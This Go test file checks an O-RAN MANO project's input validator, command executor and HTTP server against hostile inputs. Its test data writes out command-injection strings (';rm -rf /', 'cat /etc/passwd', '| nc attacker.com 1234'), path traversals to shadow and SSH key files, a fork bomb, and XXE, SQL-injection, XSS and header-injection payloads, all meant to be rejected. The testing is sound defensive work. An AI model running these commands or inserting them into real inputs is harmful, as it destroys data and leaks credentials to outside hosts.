// Copyright 2024 O-RAN Intent MANO Project
// SPDX-License-Identifier: Apache-2.0

package security

import (
	"context"
	"crypto/rand"
	"encoding/json"
	"fmt"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/thc1006/O-RAN-Intent-MANO-for-Network-Slicing/pkg/security"
)

// NegativeSecurityTestSuite contains comprehensive security violation tests
type NegativeSecurityTestSuite struct {
	executor  *security.SecureSubprocessExecutor
	validator *security.InputValidator
	logger    *TestSecureLogger
	handler   *SecureErrorHandler
}

func NewNegativeSecurityTestSuite() *NegativeSecurityTestSuite {
	logger := NewTestSecureLogger()
	return &NegativeSecurityTestSuite{
		executor:  security.NewSecureSubprocessExecutor(),
		validator: security.NewInputValidator(),
		logger:    logger,
		handler:   NewSecureErrorHandler(logger),
	}
}

// TestSecurityViolationDetection tests that all security violations are properly detected and rejected
func TestSecurityViolationDetection(t *testing.T) {
	suite := NewNegativeSecurityTestSuite()

	t.Run("command_injection_violations", func(t *testing.T) {
		suite.testCommandInjectionViolations(t)
	})

	t.Run("path_traversal_violations", func(t *testing.T) {
		suite.testPathTraversalViolations(t)
	})

	t.Run("input_validation_violations", func(t *testing.T) {
		suite.testInputValidationViolations(t)
	})

	t.Run("buffer_overflow_violations", func(t *testing.T) {
		suite.testBufferOverflowViolations(t)
	})

	t.Run("privilege_escalation_violations", func(t *testing.T) {
		suite.testPrivilegeEscalationViolations(t)
	})

	t.Run("information_disclosure_violations", func(t *testing.T) {
		suite.testInformationDisclosureViolations(t)
	})

	t.Run("denial_of_service_violations", func(t *testing.T) {
		suite.testDenialOfServiceViolations(t)
	})
}

func (suite *NegativeSecurityTestSuite) testCommandInjectionViolations(t *testing.T) {
	ctx := context.Background()

	injectionPayloads := []struct {
		name        string
		command     string
		args        []string
		description string
	}{
		{
			name:        "semicolon_injection",
			command:     "ping",
			args:        []string{"-c", "1", "127.0.0.1; cat /etc/passwd"},
			description: "Semicolon command injection",
		},
		{
			name:        "pipe_injection",
			command:     "ping",
			args:        []string{"-c", "1", "127.0.0.1 | nc attacker.com 1234"},
			description: "Pipe command injection",
		},
		{
			name:        "ampersand_injection",
			command:     "ping",
			args:        []string{"-c", "1", "127.0.0.1 & rm -rf /tmp/*"},
			description: "Ampersand background command injection",
		},
		{
			name:        "backtick_injection",
			command:     "ping",
			args:        []string{"-c", "1", "`whoami`"},
			description: "Backtick command substitution",
		},
		{
			name:        "dollar_injection",
			command:     "ping",
			args:        []string{"-c", "1", "$(id)"},
			description: "Dollar command substitution",
		},
		{
			name:        "newline_injection",
			command:     "ping",
			args:        []string{"-c", "1", "127.0.0.1\ncat /etc/passwd"},
			description: "Newline command injection",
		},
		{
			name:        "redirect_injection",
			command:     "ping",
			args:        []string{"-c", "1", "127.0.0.1 > /tmp/output.txt"},
			description: "Output redirection injection",
		},
		{
			name:        "append_injection",
			command:     "ping",
			args:        []string{"-c", "1", "127.0.0.1 >> /var/log/malicious.log"},
			description: "Append redirection injection",
		},
		{
			name:        "input_injection",
			command:     "ping",
			args:        []string{"-c", "1", "127.0.0.1 < /etc/passwd"},
			description: "Input redirection injection",
		},
		{
			name:        "tee_injection",
			command:     "ping",
			args:        []string{"-c", "1", "127.0.0.1 | tee /tmp/leaked.txt"},
			description: "Tee command injection for data exfiltration",
		},
	}

	for _, payload := range injectionPayloads {
		t.Run(payload.name, func(t *testing.T) {
			_, err := suite.executor.SecureExecute(ctx, payload.command, payload.args...)

			assert.Error(t, err, "Should reject %s", payload.description)
			assert.True(t,
				strings.Contains(err.Error(), "argument validation failed") ||
					strings.Contains(err.Error(), "dangerous characters") ||
					strings.Contains(err.Error(), "command not in allowlist"),
				"Error should indicate security violation: %v", err)
		})
	}
}

func (suite *NegativeSecurityTestSuite) testPathTraversalViolations(t *testing.T) {
	pathTraversalPayloads := []struct {
		name string
		path string
	}{
		{"basic_traversal", "../../../etc/passwd"},
		{"encoded_traversal", "..%2F..%2F..%2Fetc%2Fpasswd"},
		{"double_encoded", "..%252F..%252F..%252Fetc%252Fpasswd"},
		{"unicode_traversal", "..\\u002f..\\u002f..\\u002fetc\\u002fpasswd"},
		{"mixed_slashes", "..\\..\\..\\etc\\passwd"},
		{"absolute_path", "/etc/passwd"},
		{"home_traversal", "../../../home/user/.ssh/id_rsa"},
		{"proc_traversal", "../../../proc/version"},
		{"sys_traversal", "../../../sys/class/net"},
		{"long_traversal", strings.Repeat("../", 50) + "etc/passwd"},
		{"null_byte_traversal", "../../../etc/passwd\x00.txt"},
		{"space_traversal", "../ ../etc/passwd"},
	}

	for _, payload := range pathTraversalPayloads {
		t.Run(payload.name, func(t *testing.T) {
			err := suite.validator.ValidateFilePath(payload.path)
			assert.Error(t, err, "Should reject path traversal: %s", payload.path)
		})
	}
}

func (suite *NegativeSecurityTestSuite) testInputValidationViolations(t *testing.T) {
	t.Run("malicious_network_interfaces", func(t *testing.T) {
		maliciousInterfaces := []string{
			"eth0; rm -rf /",
			"br0 && cat /etc/passwd",
			"lo | nc attacker.com 1234",
			"docker0`whoami`",
			"vlan100$(id)",
			"tun0\ncat /etc/shadow",
			"tap0>>/tmp/output",
			strings.Repeat("a", 1000), // Too long
			"eth0\x00hidden",          // Null byte
			"../../../etc/passwd",     // Path traversal
		}

		for _, iface := range maliciousInterfaces {
			err := suite.validator.ValidateNetworkInterface(iface)
			assert.Error(t, err, "Should reject malicious interface: %s", iface)
		}
	})

	t.Run("malicious_ip_addresses", func(t *testing.T) {
		maliciousIPs := []string{
			"192.168.1.1; cat /etc/passwd",
			"127.0.0.1 && rm -rf /",
			"10.0.0.1 | nc attacker.com 1234",
			"172.16.0.1`whoami`",
			"192.168.1.1$(id)",
			"127.0.0.1\ncat /etc/shadow",
			"999.999.999.999",    // Invalid range
			"192.168.1.256",      // Invalid octet
			"192.168.1",          // Incomplete
			"192.168.1.1.1",      // Too many octets
			"192.168.1.1/24",     // CIDR notation not allowed
			"192.168.1.1:8080",   // Port not allowed
			"fe80::1; rm -rf /",  // IPv6 with injection
			"::1 && cat /etc/passwd",
		}

		for _, ip := range maliciousIPs {
			err := suite.validator.ValidateIPAddress(ip)
			assert.Error(t, err, "Should reject malicious IP: %s", ip)
		}
	})

	t.Run("malicious_ports", func(t *testing.T) {
		maliciousPorts := []int{
			-1,      // Negative
			0,       // Zero
			65536,   // Too high
			999999,  // Way too high
		}

		for _, port := range maliciousPorts {
			err := suite.validator.ValidatePort(port)
			assert.Error(t, err, "Should reject malicious port: %d", port)
		}
	})

	t.Run("malicious_command_arguments", func(t *testing.T) {
		maliciousArgs := []string{
			"; rm -rf /",
			"&& cat /etc/passwd",
			"| nc attacker.com 1234",
			"`whoami`",
			"$(id)",
			"\ncat /etc/shadow",
			">>/tmp/output",
			"$HOME/malicious",
			"${PATH}/evil",
			"'$(dangerous_command)'",
			"\"$(evil_command)\"",
			strings.Repeat("A", 1000), // Buffer overflow attempt
			"test\x00hidden",           // Null byte injection
			"unicode\u0000injection",   // Unicode null
			"format%s%s%s%s",          // Format string attack
			"test\r\ninjected",        // CRLF injection
		}

		for _, arg := range maliciousArgs {
			err := suite.validator.ValidateCommandArgument(arg)
			assert.Error(t, err, "Should reject malicious argument: %s", arg)
		}
	})
}

func (suite *NegativeSecurityTestSuite) testBufferOverflowViolations(t *testing.T) {
	ctx := context.Background()

	t.Run("oversized_arguments", func(t *testing.T) {
		// Create extremely long arguments
		longArg := strings.Repeat("A", 100000)

		_, err := suite.executor.SecureExecute(ctx, "ping", "-c", "1", longArg)
		assert.Error(t, err, "Should reject oversized arguments")
	})

	t.Run("too_many_arguments", func(t *testing.T) {
		// Create too many arguments
		args := make([]string, 1000)
		for i := range args {
			args[i] = fmt.Sprintf("arg%d", i)
		}

		_, err := suite.executor.SecureExecute(ctx, "ping", args...)
		assert.Error(t, err, "Should reject too many arguments")
	})

	t.Run("format_string_overflow", func(t *testing.T) {
		formatStrings := []string{
			strings.Repeat("%s", 1000),
			strings.Repeat("%x", 1000),
			strings.Repeat("%n", 100),
			strings.Repeat("%.1000000s", 10),
		}

		for _, fmtStr := range formatStrings {
			_, err := suite.executor.SecureExecute(ctx, "ping", "-c", "1", fmtStr)
			assert.Error(t, err, "Should reject format string overflow: %s", fmtStr)
		}
	})
}

func (suite *NegativeSecurityTestSuite) testPrivilegeEscalationViolations(t *testing.T) {
	ctx := context.Background()

	privilegedCommands := []string{
		"sudo",
		"su",
		"passwd",
		"chown",
		"chmod",
		"mount",
		"umount",
		"systemctl",
		"service",
		"crontab",
		"at",
		"setuid",
		"setgid",
		"useradd",
		"userdel",
		"usermod",
		"groupadd",
		"groupdel",
		"visudo",
		"pkexec",
		"gksudo",
	}

	for _, cmd := range privilegedCommands {
		t.Run(fmt.Sprintf("reject_%s", cmd), func(t *testing.T) {
			_, err := suite.executor.SecureExecute(ctx, cmd, "--help")
			assert.Error(t, err, "Should reject privileged command: %s", cmd)
			assert.Contains(t, err.Error(), "command not in allowlist",
				"Should indicate command not allowed")
		})
	}
}

func (suite *NegativeSecurityTestSuite) testInformationDisclosureViolations(t *testing.T) {
	t.Run("sensitive_file_access", func(t *testing.T) {
		sensitiveFiles := []string{
			"/etc/passwd",
			"/etc/shadow",
			"/etc/sudoers",
			"/root/.ssh/id_rsa",
			"/home/user/.ssh/id_rsa",
			"/var/log/auth.log",
			"/var/log/secure",
			"/proc/version",
			"/proc/cmdline",
			"/proc/environ",
			"/sys/class/dmi/id/product_serial",
			"/dev/mem",
			"/dev/kmem",
		}

		for _, file := range sensitiveFiles {
			err := suite.validator.ValidateFilePath(file)
			if err == nil {
				// If path is allowed, ensure we can't actually read it
				// This would be checked at runtime
				t.Logf("Path %s passed validation but should be restricted at runtime", file)
			}
		}
	})

	t.Run("environment_variable_leakage", func(t *testing.T) {
		maliciousEnvValues := []string{
			"$(env)",
			"${HOME}",
			"$PATH",
			"`printenv`",
			"$(printenv)",
			"$USER",
			"${PWD}",
			"$SHELL",
		}

		for _, envVal := range maliciousEnvValues {
			err := suite.validator.ValidateEnvironmentValue(envVal)
			assert.Error(t, err, "Should reject environment variable leakage: %s", envVal)
		}
	})
}

func (suite *NegativeSecurityTestSuite) testDenialOfServiceViolations(t *testing.T) {
	ctx := context.Background()

	t.Run("resource_exhaustion_commands", func(t *testing.T) {
		// These commands could cause resource exhaustion
		dosCommands := []struct {
			command string
			args    []string
		}{
			{"yes", []string{}},                              // Infinite output
			{"cat", []string{"/dev/urandom"}},               // Infinite random data
			{"find", []string{"/", "-name", "*"}},           // Filesystem exhaustion
			{"dd", []string{"if=/dev/zero", "of=/dev/null"}}, // CPU/IO exhaustion
			{"fork", []string{}},                            // Fork bomb attempt
			{":(){ :|:& };:", []string{}},                   // Classic fork bomb
		}

		for _, cmd := range dosCommands {
			t.Run(fmt.Sprintf("reject_%s", cmd.command), func(t *testing.T) {
				_, err := suite.executor.SecureExecute(ctx, cmd.command, cmd.args...)
				assert.Error(t, err, "Should reject DoS command: %s", cmd.command)
			})
		}
	})

	t.Run("timeout_violations", func(t *testing.T) {
		// Register a command with very short timeout for testing
		shortTimeoutCmd := &security.AllowedCommand{
			Command:     "sleep",
			AllowedArgs: map[string]bool{},
			ArgPatterns: []string{`^\d+$`},
			MaxArgs:     2,
			Timeout:     100 * time.Millisecond,
			Description: "Sleep command with short timeout",
		}

		suite.executor.RegisterCommand(shortTimeoutCmd)

		// Try to run command that exceeds timeout
		start := time.Now()
		_, err := suite.executor.SecureExecute(ctx, "sleep", "10")
		duration := time.Since(start)

		assert.Error(t, err, "Should timeout long-running command")
		assert.True(t, duration < 1*time.Second, "Should timeout quickly")
		assert.True(t, strings.Contains(err.Error(), "timeout") ||
			strings.Contains(err.Error(), "context deadline exceeded"),
			"Should indicate timeout error")
	})

	t.Run("memory_exhaustion", func(t *testing.T) {
		// Try to allocate huge amounts of memory
		hugeData := make([]byte, 1024*1024) // 1MB
		_, err := rand.Read(hugeData)
		require.NoError(t, err)

		maliciousConfig := map[string]interface{}{
			"data": string(hugeData),
		}

		err = suite.validator.ValidateEnvironmentValue(string(hugeData))
		assert.Error(t, err, "Should reject huge data that could exhaust memory")

		// Test with JSON encoding which could cause memory issues
		_, err = json.Marshal(maliciousConfig)
		// JSON marshal should work, but our validators should catch it
		if err == nil {
			err = suite.validator.ValidateEnvironmentValue(fmt.Sprintf("%v", maliciousConfig))
			assert.Error(t, err, "Should reject large configuration data")
		}
	})
}

// TestSecurityFuzzing performs fuzzing tests to find edge cases
func TestSecurityFuzzing(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping fuzzing tests in short mode")
	}

	suite := NewNegativeSecurityTestSuite()

	t.Run("fuzz_command_arguments", func(t *testing.T) {
		suite.fuzzCommandArguments(t, 1000)
	})

	t.Run("fuzz_network_interfaces", func(t *testing.T) {
		suite.fuzzNetworkInterfaces(t, 500)
	})

	t.Run("fuzz_file_paths", func(t *testing.T) {
		suite.fuzzFilePaths(t, 500)
	})

	t.Run("fuzz_ip_addresses", func(t *testing.T) {
		suite.fuzzIPAddresses(t, 500)
	})
}

func (suite *NegativeSecurityTestSuite) fuzzCommandArguments(t *testing.T, iterations int) {
	dangerousChars := []rune{';', '&', '|', '`', '$', '(', ')', '\n', '\r', '\t', '\x00', '\\', '\'', '"', '<', '>', '*', '?', '[', ']', '{', '}'}

	for i := 0; i < iterations; i++ {
		// Generate random malicious input
		length := 1 + (i % 100) // Variable length 1-100
		arg := make([]rune, length)

		for j := 0; j < length; j++ {
			if j%5 == 0 && len(dangerousChars) > 0 {
				// Insert dangerous character
				arg[j] = dangerousChars[i%len(dangerousChars)]
			} else {
				// Random character
				arg[j] = rune(32 + (i*j)%95) // Printable ASCII
			}
		}

		fuzzInput := string(arg)
		err := suite.validator.ValidateCommandArgument(fuzzInput)

		// Most fuzzing inputs should be rejected
		if err == nil {
			// If it passes, ensure it's actually safe
			safe := true
			for _, char := range dangerousChars {
				if strings.ContainsRune(fuzzInput, char) {
					safe = false
					break
				}
			}

			if !safe {
				t.Errorf("Fuzzing input should have been rejected: %q", fuzzInput)
			}
		}
	}
}

func (suite *NegativeSecurityTestSuite) fuzzNetworkInterfaces(t *testing.T, iterations int) {
	for i := 0; i < iterations; i++ {
		// Generate random interface names with potential injection
		patterns := []string{
			"eth%d; rm -rf /",
			"br%d && cat /etc/passwd",
			"lo%d | nc attacker.com 1234",
			"docker%d`whoami`",
			"vlan%d$(id)",
			"tun%d\nmalicious",
			strings.Repeat("a", i%200), // Variable length
		}

		pattern := patterns[i%len(patterns)]
		fuzzInput := fmt.Sprintf(pattern, i)

		err := suite.validator.ValidateNetworkInterface(fuzzInput)
		assert.Error(t, err, "Fuzzed interface should be rejected: %s", fuzzInput)
	}
}

func (suite *NegativeSecurityTestSuite) fuzzFilePaths(t *testing.T, iterations int) {
	traversalPatterns := []string{
		"../",
		"..\\",
		"..%2F",
		"..%5C",
		"..%252F",
		"..\\u002f",
		"..\\u005c",
	}

	for i := 0; i < iterations; i++ {
		// Build path with random traversal attempts
		depth := 1 + (i % 10)
		pattern := traversalPatterns[i%len(traversalPatterns)]

		fuzzPath := strings.Repeat(pattern, depth) + "etc/passwd"

		err := suite.validator.ValidateFilePath(fuzzPath)
		assert.Error(t, err, "Fuzzed path should be rejected: %s", fuzzPath)
	}
}

func (suite *NegativeSecurityTestSuite) fuzzIPAddresses(t *testing.T, iterations int) {
	for i := 0; i < iterations; i++ {
		// Generate malformed IP addresses
		patterns := []string{
			"%d.%d.%d.%d; rm -rf /",
			"%d.%d.%d.%d && cat /etc/passwd",
			"%d.%d.%d.%d | nc attacker.com 1234",
			"%d.%d.%d.%d`whoami`",
			"%d.%d.%d.%d$(id)",
			"%d.%d.%d.%d\nmalicious",
			"%d.%d.%d.999", // Invalid octet
			"%d.%d.%d",     // Incomplete
			"%d.%d.%d.%d.%d", // Too many octets
		}

		pattern := patterns[i%len(patterns)]

		// Generate random octets (some invalid)
		oct1 := i % 300        // 0-299 (some invalid)
		oct2 := (i * 2) % 300
		oct3 := (i * 3) % 300
		oct4 := (i * 4) % 300

		fuzzIP := fmt.Sprintf(pattern, oct1, oct2, oct3, oct4)

		err := suite.validator.ValidateIPAddress(fuzzIP)
		// Most should be rejected, valid IPs might pass basic format check
		if err == nil {
			// Verify it's actually a valid IP format
			parts := strings.Split(strings.Split(fuzzIP, " ")[0], ".")
			if len(parts) == 4 {
				valid := true
				for _, part := range parts {
					if val := parseIntSafe(part); val < 0 || val > 255 {
						valid = false
						break
					}
				}
				if !valid {
					t.Errorf("Invalid IP format should have been rejected: %s", fuzzIP)
				}
			} else {
				t.Errorf("Malformed IP should have been rejected: %s", fuzzIP)
			}
		}
	}
}

// parseIntSafe safely parses integers for testing
func parseIntSafe(s string) int {
	if len(s) == 0 {
		return -1
	}

	result := 0
	for _, r := range s {
		if r < '0' || r > '9' {
			return -1
		}
		result = result*10 + int(r-'0')
		if result > 255 {
			return -1
		}
	}
	return result
}

// TestHTTPSecurityViolations tests HTTP-specific security violations
func TestHTTPSecurityViolations(t *testing.T) {
	t.Run("malicious_http_requests", func(t *testing.T) {
		testMaliciousHTTPRequests(t)
	})

	t.Run("http_header_injection", func(t *testing.T) {
		testHTTPHeaderInjection(t)
	})

	t.Run("content_type_violations", func(t *testing.T) {
		testContentTypeViolations(t)
	})
}

func testMaliciousHTTPRequests(t *testing.T) {
	server := NewSecureHTTPServer(nil)

	maliciousRequests := []struct {
		name   string
		method string
		path   string
		body   string
		headers map[string]string
	}{
		{
			name:   "path_traversal_url",
			method: "GET",
			path:   "/../../../etc/passwd",
			body:   "",
		},
		{
			name:   "encoded_path_traversal",
			method: "GET",
			path:   "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
			body:   "",
		},
		{
			name:   "null_byte_url",
			method: "GET",
			path:   "/health%00../../etc/passwd",
			body:   "",
		},
		{
			name:   "sql_injection_url",
			method: "GET",
			path:   "/health?id=1'; DROP TABLE users; --",
			body:   "",
		},
		{
			name:   "xss_in_url",
			method: "GET",
			path:   "/health?msg=<script>alert('xss')</script>",
			body:   "",
		},
		{
			name:   "command_injection_body",
			method: "PUT",
			path:   "/config",
			body:   `{"config": "; rm -rf /"}`,
			headers: map[string]string{"Content-Type": "application/json"},
		},
		{
			name:   "oversized_request",
			method: "PUT",
			path:   "/config",
			body:   strings.Repeat("A", 10*1024*1024), // 10MB
			headers: map[string]string{"Content-Type": "application/json"},
		},
	}

	for _, req := range maliciousRequests {
		t.Run(req.name, func(t *testing.T) {
			httpReq := httptest.NewRequest(req.method, req.path, strings.NewReader(req.body))

			for key, value := range req.headers {
				httpReq.Header.Set(key, value)
			}

			w := httptest.NewRecorder()
			server.router.ServeHTTP(w, httpReq)

			// Should reject or handle safely
			assert.True(t, w.Code >= 400 || w.Code == 404,
				"Malicious request should be rejected or return error: %s", req.name)
		})
	}
}

func testHTTPHeaderInjection(t *testing.T) {
	server := NewSecureHTTPServer(nil)

	headerInjections := []struct {
		name   string
		header string
		value  string
	}{
		{
			name:   "crlf_injection",
			header: "X-Test",
			value:  "value\r\nSet-Cookie: malicious=true",
		},
		{
			name:   "newline_injection",
			header: "X-Test",
			value:  "value\nX-Malicious: injected",
		},
		{
			name:   "null_byte_injection",
			header: "X-Test",
			value:  "value\x00X-Evil: true",
		},
		{
			name:   "unicode_injection",
			header: "X-Test",
			value:  "value\u000aX-Unicode-Evil: true",
		},
	}

	for _, injection := range headerInjections {
		t.Run(injection.name, func(t *testing.T) {
			req := httptest.NewRequest("GET", "/health", nil)
			req.Header.Set(injection.header, injection.value)

			w := httptest.NewRecorder()
			server.router.ServeHTTP(w, req)

			// Check that injected headers are not present in response
			for headerName := range w.Header() {
				assert.False(t,
					strings.Contains(headerName, "Malicious") ||
					strings.Contains(headerName, "Evil") ||
					strings.Contains(headerName, "Set-Cookie"),
					"Injected header should not be present: %s", headerName)
			}
		})
	}
}

func testContentTypeViolations(t *testing.T) {
	server := NewSecureHTTPServer(nil)

	contentTypeAttacks := []struct {
		name        string
		contentType string
		body        string
	}{
		{
			name:        "xml_external_entity",
			contentType: "application/xml",
			body:        `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>`,
		},
		{
			name:        "multipart_bomb",
			contentType: "multipart/form-data; boundary=----WebKitFormBoundary",
			body:        strings.Repeat("------WebKitFormBoundary\r\nContent-Disposition: form-data; name=\"field\"\r\n\r\nvalue\r\n", 10000),
		},
		{
			name:        "malicious_json",
			contentType: "application/json",
			body:        `{"__proto__": {"admin": true}}`,
		},
		{
			name:        "script_content_type",
			contentType: "application/javascript",
			body:        `alert('xss')`,
		},
	}

	for _, attack := range contentTypeAttacks {
		t.Run(attack.name, func(t *testing.T) {
			req := httptest.NewRequest("PUT", "/config", strings.NewReader(attack.body))
			req.Header.Set("Content-Type", attack.contentType)

			w := httptest.NewRecorder()
			server.router.ServeHTTP(w, req)

			// Should reject or handle safely
			assert.True(t, w.Code >= 400,
				"Malicious content type should be rejected: %s", attack.name)
		})
	}
}

// TestSecurityBypassAttempts tests sophisticated attempts to bypass security controls
func TestSecurityBypassAttempts(t *testing.T) {
	suite := NewNegativeSecurityTestSuite()

	t.Run("encoding_bypass_attempts", func(t *testing.T) {
		suite.testEncodingBypass(t)
	})

	t.Run("timing_attack_resistance", func(t *testing.T) {
		suite.testTimingAttackResistance(t)
	})

	t.Run("state_confusion_attacks", func(t *testing.T) {
		suite.testStateConfusionAttacks(t)
	})
}

func (suite *NegativeSecurityTestSuite) testEncodingBypass(t *testing.T) {
	encodingAttempts := []struct {
		name     string
		original string
		encoded  string
	}{
		{
			name:     "url_encoding",
			original: "; rm -rf /",
			encoded:  "%3B%20rm%20-rf%20%2F",
		},
		{
			name:     "double_url_encoding",
			original: "; rm -rf /",
			encoded:  "%253B%2520rm%2520-rf%2520%252F",
		},
		{
			name:     "html_entity_encoding",
			original: "& cat /etc/passwd",
			encoded:  "&amp; cat /etc/passwd",
		},
		{
			name:     "unicode_encoding",
			original: "; rm -rf /",
			encoded:  "\\u003B rm -rf /",
		},
		{
			name:     "hex_encoding",
			original: "; rm -rf /",
			encoded:  "\\x3B rm -rf /",
		},
		{
			name:     "base64_encoding",
			original: "; rm -rf /",
			encoded:  func() string { return "decoded_from_base64" }(), // Simplified for test
		},
	}

	for _, attempt := range encodingAttempts {
		t.Run(attempt.name, func(t *testing.T) {
			// Test with validator
			err := suite.validator.ValidateCommandArgument(attempt.encoded)
			assert.Error(t, err, "Encoded bypass should be rejected: %s", attempt.encoded)

			// Test with executor
			ctx := context.Background()
			_, err = suite.executor.SecureExecute(ctx, "ping", "-c", "1", attempt.encoded)
			assert.Error(t, err, "Encoded bypass should be rejected by executor: %s", attempt.encoded)
		})
	}
}

func (suite *NegativeSecurityTestSuite) testTimingAttackResistance(t *testing.T) {
	// Test that validation times are consistent to prevent timing attacks
	validInputs := []string{
		"eth0",
		"127.0.0.1",
		"8080",
		"/tmp/test.txt",
	}

	invalidInputs := []string{
		"eth0; rm -rf /",
		"127.0.0.1 && cat /etc/passwd",
		"8080 | nc attacker.com 1234",
		"/tmp/test.txt; cat /etc/passwd",
	}

	// Measure timing for valid inputs
	var validTimes []time.Duration
	for _, input := range validInputs {
		start := time.Now()
		suite.validator.ValidateCommandArgument(input)
		validTimes = append(validTimes, time.Since(start))
	}

	// Measure timing for invalid inputs
	var invalidTimes []time.Duration
	for _, input := range invalidInputs {
		start := time.Now()
		suite.validator.ValidateCommandArgument(input)
		invalidTimes = append(invalidTimes, time.Since(start))
	}

	// Calculate average times
	var validTotal, invalidTotal time.Duration
	for _, t := range validTimes {
		validTotal += t
	}
	for _, t := range invalidTimes {
		invalidTotal += t
	}

	validAvg := validTotal / time.Duration(len(validTimes))
	invalidAvg := invalidTotal / time.Duration(len(invalidTimes))

	// Times should be similar to prevent timing attacks
	ratio := float64(validAvg) / float64(invalidAvg)
	assert.True(t, ratio > 0.5 && ratio < 2.0,
		"Validation timing should be consistent to prevent timing attacks. Valid: %v, Invalid: %v, Ratio: %f",
		validAvg, invalidAvg, ratio)
}

func (suite *NegativeSecurityTestSuite) testStateConfusionAttacks(t *testing.T) {
	// Test for state confusion vulnerabilities
	ctx := context.Background()

	t.Run("concurrent_validation_confusion", func(t *testing.T) {
		// Try to confuse validator with concurrent access
		const numGoroutines = 100
		results := make(chan error, numGoroutines)

		for i := 0; i < numGoroutines; i++ {
			go func(id int) {
				if id%2 == 0 {
					// Valid input
					err := suite.validator.ValidateCommandArgument("test")
					results <- err
				} else {
					// Invalid input
					err := suite.validator.ValidateCommandArgument("test; rm -rf /")
					results <- err
				}
			}(i)
		}

		validCount := 0
		invalidCount := 0

		for i := 0; i < numGoroutines; i++ {
			select {
			case err := <-results:
				if err == nil {
					validCount++
				} else {
					invalidCount++
				}
			case <-time.After(5 * time.Second):
				t.Fatal("Timeout waiting for concurrent validation")
			}
		}

		// Should have roughly equal valid and invalid results
		assert.True(t, validCount > 0, "Should have some valid results")
		assert.True(t, invalidCount > 0, "Should have some invalid results")
		assert.True(t, validCount+invalidCount == numGoroutines, "Should have all results")
	})

	t.Run("command_substitution_confusion", func(t *testing.T) {
		// Test various command substitution bypass attempts
		confusionAttempts := []string{
			"test$(echo malicious)",
			"test`echo malicious`",
			"test$((1+1))",
			"test${HOME}",
			"test$[1+1]",
			"test\\$(echo safe)", // Escaped
			"test\\`echo safe\\`", // Escaped
		}

		for _, attempt := range confusionAttempts {
			_, err := suite.executor.SecureExecute(ctx, "ping", "-c", "1", attempt)
			assert.Error(t, err, "Command substitution should be rejected: %s", attempt)
		}
	})
}

// BenchmarkSecurityViolationDetection benchmarks the performance of security validation
func BenchmarkSecurityViolationDetection(b *testing.B) {
	suite := NewNegativeSecurityTestSuite()

	b.Run("command_injection_detection", func(b *testing.B) {
		maliciousArg := "test; rm -rf /"
		b.ResetTimer()
		for i := 0; i < b.N; i++ {
			suite.validator.ValidateCommandArgument(maliciousArg)
		}
	})

	b.Run("path_traversal_detection", func(b *testing.B) {
		maliciousPath := "../../../etc/passwd"
		b.ResetTimer()
		for i := 0; i < b.N; i++ {
			suite.validator.ValidateFilePath(maliciousPath)
		}
	})

	b.Run("ip_injection_detection", func(b *testing.B) {
		maliciousIP := "127.0.0.1; cat /etc/passwd"
		b.ResetTimer()
		for i := 0; i < b.N; i++ {
			suite.validator.ValidateIPAddress(maliciousIP)
		}
	})
}